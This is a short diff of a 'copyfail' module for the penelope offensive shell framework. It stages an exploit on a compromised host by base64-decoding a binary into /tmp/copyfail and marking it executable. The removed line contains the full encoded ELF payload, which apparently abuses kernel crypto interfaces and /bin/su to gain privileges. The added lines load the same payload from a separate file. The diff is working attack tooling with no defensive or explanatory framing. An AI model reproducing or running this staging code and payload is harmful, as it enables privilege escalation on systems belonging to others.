@@ -128,9 +128,13 @@ class copyfail(penelope.Module):
         host = session._host
         port = session._port
 
+        import os as _os
+        _here = _os.path.dirname(_os.path.abspath(__file__))
+        COPYFAIL_B64 = open(_os.path.join(_here, "b64_binaries", "copyfail.b64")).read().strip()
+
         # Stage exploit — value=True blocks until write completes
         staged = session.exec(
-            "echo 'f0VMRgIBAQAvYmluL3N1AAIAPgABAAAAlwBAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAACYAYWVhZAAAmgEAAAAAAACaAQAAAAAAAGF1dGhlbmNlc24oaG1hYyhtZDUpLGVjYihjaXBoZXJfbnVsbCkpADH/amlYDwW/CABAADH2hcB4CsZHBmhqO1iZDwVqAliZDwWVvNgCQACJ4GeNSNCJTCTIxkQk0BTHRCSACAABAGa6FwFmiVQk2MZEJNwExkQk4AiJRCToxkQk8AiD6BiJRCS4/kQkwDHbailYmYkUJWgAQABqJl9qBV4PBb5YAEAAl7I/sDEPBcYEJWkAQAACvhcBAACwNrIBTI1UJIBBsAgPBUmDwgRBsASyBbA2DwVFMdIx9rArmQ8FlzHSi4sAAEAAiUwkBI10JKi2gGouWA8FTIlUJPiDwwSJ7o1UJPhJidqwKA8FRTHSjVMEVF6wLQ8FgP8CdcO/CABAADH26RP///8=' | base64 -d > /tmp/copyfail && chmod +x /tmp/copyfail && echo staged",
+            f"echo '{COPYFAIL_B64}' | base64 -d > /tmp/copyfail && chmod +x /tmp/copyfail && echo staged",
             value=True
         )
         if not staged or "staged" not in staged:
